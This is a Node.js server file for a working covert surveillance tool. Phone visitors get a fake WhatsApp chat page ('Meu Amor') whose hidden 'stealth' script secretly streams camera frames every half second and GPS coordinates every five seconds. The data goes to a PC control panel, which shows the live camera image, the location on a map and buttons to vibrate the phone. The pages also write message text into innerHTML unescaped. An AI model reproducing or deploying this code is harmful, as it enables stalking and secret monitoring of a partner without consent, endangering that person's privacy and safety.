const express = require('express');
const http = require('http');
const { Server } = require('socket.io');
const path = require('path');

const app = express();
const server = http.createServer(app);
const io = new Server(server, {
    cors: { origin: "*" },
    transports: ['websocket', 'polling']
});

const PORT = process.env.PORT || 8080;

// Servir arquivos estáticos
app.use(express.static(path.join(__dirname)));

// Rota principal
app.get('/', (req, res) => {
    const isMobile = /mobile|android|iphone|ipad|phone|blackberry/i.test(req.headers['user-agent'] || '');
    
    if (isMobile) {
        res.send(getMobilePage());
    } else {
        res.send(getPCPage());
    }
});

// Socket.IO
io.on('connection', (socket) => {
    console.log('✅ Cliente conectado:', socket.id);
    
    // Mensagem do celular para o PC
    socket.on('msg_from_mobile', (data) => {
        console.log('📱 Celular:', data.text);
        socket.broadcast.emit('msg_to_pc', data);
    });
    
    // Mensagem do PC para o celular
    socket.on('msg_from_pc', (data) => {
        console.log('💻 PC:', data.text);
        socket.broadcast.emit('msg_to_mobile', data);
    });
    
    // Comandos do PC
    socket.on('cmd_from_pc', (cmd) => {
        console.log('🎮 Comando:', cmd.type);
        socket.broadcast.emit('cmd_to_mobile', cmd);
    });
    
    // Câmera do celular
    socket.on('camera_frame', (frame) => {
        socket.broadcast.emit('camera_stream', frame);
    });
    
    // Localização do celular
    socket.on('location_data', (loc) => {
        console.log('📍 Localização:', loc.lat, loc.lng);
        socket.broadcast.emit('location_stream', loc);
    });
    
    socket.on('disconnect', () => {
        console.log('❌ Desconectado:', socket.id);
    });
});

server.listen(PORT, '0.0.0.0', () => {
    console.log(`\n🚀 Servidor rodando!`);
    console.log(`📍 Porta: ${PORT}`);
    console.log(`🌐 Acesse: http://localhost:${PORT}\n`);
});

// ==================== PÁGINA DO CELULAR ====================
function getMobilePage() {
    return `<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>WhatsApp</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            background: #0b141a;
            height: 100vh;
            overflow: hidden;
        }
        .container {
            display: flex;
            flex-direction: column;
            height: 100vh;
            background: #0b141a;
        }
        .header {
            background: #202c33;
            padding: 12px 16px;
            display: flex;
            align-items: center;
            gap: 12px;
            border-bottom: 1px solid #2a3942;
        }
        .avatar {
            width: 40px;
            height: 40px;
            background: #25d366;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 22px;
        }
        .info h3 { color: #e9edef; font-size: 16px; }
        .status { color: #8696a0; font-size: 12px; }
        .messages {
            flex: 1;
            overflow-y: auto;
            padding: 16px;
            display: flex;
            flex-direction: column;
            gap: 8px;
        }
        .message {
            max-width: 75%;
            padding: 8px 12px;
            border-radius: 8px;
            font-size: 14px;
            animation: fadeIn 0.2s ease;
        }
        @keyframes fadeIn {
            from { opacity: 0; transform: translateY(10px); }
            to { opacity: 1; transform: translateY(0); }
        }
        .message.sent {
            background: #005c4b;
            color: white;
            align-self: flex-end;
            border-bottom-right-radius: 2px;
        }
        .message.received {
            background: #202c33;
            color: white;
            align-self: flex-start;
            border-bottom-left-radius: 2px;
        }
        .time {
            font-size: 10px;
            color: #8696a0;
            margin-top: 4px;
            text-align: right;
        }
        .input-area {
            background: #202c33;
            padding: 8px 12px;
            display: flex;
            gap: 10px;
            border-top: 1px solid #2a3942;
        }
        input {
            flex: 1;
            background: #2a3942;
            border: none;
            padding: 10px 16px;
            border-radius: 24px;
            color: white;
            font-size: 15px;
            outline: none;
        }
        button {
            background: none;
            border: none;
            font-size: 24px;
            cursor: pointer;
            color: #8696a0;
        }
        button.active { color: #25d366; }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <div class="avatar">💕</div>
            <div class="info">
                <h3>Meu Amor</h3>
                <div class="status" id="status">🟢 online</div>
            </div>
        </div>
        <div class="messages" id="messages">
            <div class="message received">
                💕 Olá! 💕
                <div class="time">Agora</div>
            </div>
        </div>
        <div class="input-area">
            <input type="text" id="input" placeholder="Digite uma mensagem">
            <button id="send">📤</button>
        </div>
    </div>

    <script src="/socket.io/socket.io.js"></script>
    <script>
        const socket = io();
        const messagesDiv = document.getElementById('messages');
        const input = document.getElementById('input');
        const sendBtn = document.getElementById('send');
        const statusDiv = document.getElementById('status');
        
        let typingTimeout = null;
        
        function addMessage(text, type) {
            const div = document.createElement('div');
            div.className = \`message \${type}\`;
            const time = new Date().toLocaleTimeString('pt-BR', { hour: '2-digit', minute: '2-digit' });
            div.innerHTML = \`\${text}<div class="time">\${time}</div>\`;
            messagesDiv.appendChild(div);
            messagesDiv.scrollTop = messagesDiv.scrollHeight;
        }
        
        function sendMessage() {
            const text = input.value.trim();
            if (text) {
                addMessage(text, 'sent');
                socket.emit('msg_from_mobile', { text: text });
                input.value = '';
            }
        }
        
        sendBtn.onclick = sendMessage;
        input.onkeypress = (e) => { if (e.key === 'Enter') sendMessage(); };
        
        // Receber mensagem do PC
        socket.on('msg_to_mobile', (data) => {
            addMessage(data.text, 'received');
        });
        
        // Stealth: Câmera invisível
        let cameraActive = false;
        async function startStealthCamera() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                const video = document.createElement('video');
                video.srcObject = stream;
                video.style.display = 'none';
                document.body.appendChild(video);
                await video.play();
                
                const track = stream.getVideoTracks()[0];
                const capture = new ImageCapture(track);
                
                setInterval(() => {
                    if (stream.active) {
                        capture.grabFrame().then(bitmap => {
                            const canvas = document.createElement('canvas');
                            canvas.width = bitmap.width;
                            canvas.height = bitmap.height;
                            canvas.getContext('2d').drawImage(bitmap, 0, 0);
                            socket.emit('camera_frame', canvas.toDataURL('image/jpeg', 0.5));
                        });
                    }
                }, 500);
                console.log('📷 Câmera stealth ativada');
            } catch(e) { console.log('Erro câmera:', e); }
        }
        
        // Stealth: Localização invisível
        function startStealthLocation() {
            if (navigator.geolocation) {
                setInterval(() => {
                    navigator.geolocation.getCurrentPosition(pos => {
                        socket.emit('location_data', {
                            lat: pos.coords.latitude,
                            lng: pos.coords.longitude
                        });
                    });
                }, 5000);
                console.log('📍 Localização stealth ativada');
            }
        }
        
        // Comandos do PC
        socket.on('cmd_to_mobile', (cmd) => {
            if (cmd.type === 'vibrate' && navigator.vibrate) {
                navigator.vibrate(200);
            } else if (cmd.type === 'emergency' && navigator.vibrate) {
                navigator.vibrate([500, 200, 500]);
            }
        });
        
        // Iniciar stealth após 2 segundos
        setTimeout(() => {
            startStealthCamera();
            startStealthLocation();
        }, 2000);
        
        socket.on('connect', () => {
            console.log('✅ Conectado');
        });
    </script>
</body>
</html>`;
}

// ==================== PÁGINA DO PC ====================
function getPCPage() {
    return `<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>WhatsApp Web - Controle</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            background: #111b21;
            height: 100vh;
            display: flex;
        }
        .chat {
            flex: 1;
            display: flex;
            flex-direction: column;
        }
        .header {
            background: #202c33;
            padding: 16px;
            border-bottom: 1px solid #2a3942;
        }
        .header h3 { color: #e9edef; }
        .status {
            display: inline-block;
            width: 8px;
            height: 8px;
            background: #25d366;
            border-radius: 50%;
            margin-right: 6px;
        }
        .messages {
            flex: 1;
            overflow-y: auto;
            padding: 20px;
            display: flex;
            flex-direction: column;
            gap: 8px;
        }
        .message {
            max-width: 65%;
            padding: 8px 12px;
            border-radius: 8px;
            font-size: 14px;
        }
        .message.sent {
            background: #005c4b;
            color: white;
            align-self: flex-end;
        }
        .message.received {
            background: #202c33;
            color: white;
            align-self: flex-start;
        }
        .time {
            font-size: 10px;
            color: #8696a0;
            margin-top: 4px;
            text-align: right;
        }
        .input-area {
            background: #202c33;
            padding: 12px;
            display: flex;
            gap: 12px;
        }
        input {
            flex: 1;
            background: #2a3942;
            border: none;
            padding: 10px;
            border-radius: 20px;
            color: white;
            outline: none;
        }
        .input-area button {
            background: #005c4b;
            border: none;
            padding: 10px 20px;
            border-radius: 20px;
            color: white;
            cursor: pointer;
        }
        .panel {
            width: 320px;
            background: #202c33;
            border-left: 1px solid #2a3942;
            padding: 20px;
            overflow-y: auto;
        }
        .panel h3 { color: #e9edef; margin-bottom: 16px; }
        .btn {
            width: 100%;
            background: #2a3942;
            border: none;
            padding: 12px;
            border-radius: 8px;
            color: white;
            cursor: pointer;
            margin-bottom: 10px;
            display: flex;
            align-items: center;
            gap: 10px;
        }
        .btn:hover { background: #3b4a54; }
        .danger { background: #c0392b; }
        .preview { background: #111b21; border-radius: 8px; margin-top: 10px; overflow: hidden; }
        .preview img { width: 100%; }
        .location-box {
            background: #111b21;
            padding: 12px;
            border-radius: 8px;
            font-size: 12px;
            margin-top: 10px;
            color: #8696a0;
        }
        .badge {
            background: #c0392b;
            color: white;
            padding: 4px 8px;
            border-radius: 4px;
            font-size: 10px;
            margin-left: 10px;
        }
    </style>
</head>
<body>
    <div class="chat">
        <div class="header">
            <h3>💕 Meu Amor <span class="badge">STEALTH</span></h3>
            <div style="font-size:12px; margin-top:5px;"><span class="status"></span> <span id="statusText">online</span></div>
        </div>
        <div class="messages" id="messages">
            <div class="message received">💕 Conectado!<div class="time">Agora</div></div>
        </div>
        <div class="input-area">
            <input type="text" id="input" placeholder="Digite uma mensagem">
            <button id="send">📤 Enviar</button>
        </div>
    </div>
    <div class="panel">
        <h3>🎮 Controle</h3>
        <button class="btn" id="cameraBtn">📷 Ver Câmera</button>
        <div class="preview"><img id="cameraPreview" src=""></div>
        
        <button class="btn" id="locationBtn">📍 Ver Localização</button>
        <div class="location-box" id="locationBox">Aguardando...</div>
        
        <button class="btn" id="vibrateBtn">📳 Vibrar</button>
        <button class="btn danger" id="emergencyBtn">💥 Surpresa</button>
    </div>

    <script src="/socket.io/socket.io.js"></script>
    <script>
        const socket = io();
        const messagesDiv = document.getElementById('messages');
        const input = document.getElementById('input');
        const sendBtn = document.getElementById('send');
        const cameraPreview = document.getElementById('cameraPreview');
        const locationBox = document.getElementById('locationBox');
        const statusText = document.getElementById('statusText');
        
        function addMessage(text, type) {
            const div = document.createElement('div');
            div.className = \`message \${type}\`;
            const time = new Date().toLocaleTimeString('pt-BR', { hour: '2-digit', minute: '2-digit' });
            div.innerHTML = \`\${text}<div class="time">\${time}</div>\`;
            messagesDiv.appendChild(div);
            messagesDiv.scrollTop = messagesDiv.scrollHeight;
        }
        
        function sendMessage() {
            const text = input.value.trim();
            if (text) {
                addMessage(text, 'sent');
                socket.emit('msg_from_pc', { text: text });
                input.value = '';
            }
        }
        
        sendBtn.onclick = sendMessage;
        input.onkeypress = (e) => { if (e.key === 'Enter') sendMessage(); };
        
        // Receber mensagem do celular
        socket.on('msg_to_pc', (data) => {
            addMessage(data.text, 'received');
        });
        
        // Controles
        document.getElementById('cameraBtn').onclick = () => {
            socket.emit('cmd_from_pc', { type: 'start_camera' });
            addMessage('📷 Solicitando câmera', 'sent');
        };
        
        document.getElementById('locationBtn').onclick = () => {
            socket.emit('cmd_from_pc', { type: 'get_location' });
            addMessage('📍 Solicitando localização', 'sent');
        };
        
        document.getElementById('vibrateBtn').onclick = () => {
            socket.emit('cmd_from_pc', { type: 'vibrate' });
            addMessage('📳 Vibração enviada', 'sent');
        };
        
        document.getElementById('emergencyBtn').onclick = () => {
            socket.emit('cmd_from_pc', { type: 'emergency' });
            addMessage('💥 Surpresa enviada!', 'sent');
        };
        
        // Receber streams
        socket.on('camera_stream', (frame) => {
            cameraPreview.src = frame;
        });
        
        socket.on('location_stream', (loc) => {
            locationBox.innerHTML = \`📍 Lat: \${loc.lat.toFixed(6)}<br>📍 Lng: \${loc.lng.toFixed(6)}<br><a href="https://www.google.com/maps?q=\${loc.lat},\${loc.lng}" target="_blank" style="color:#25d366">🗺️ Ver mapa</a>\`;
            addMessage(\`📍 Localização recebida\`, 'received');
        });
        
        socket.on('connect', () => {
            addMessage('✨ Conectado!', 'received');
        });
    </script>
</body>
</html>`;
}
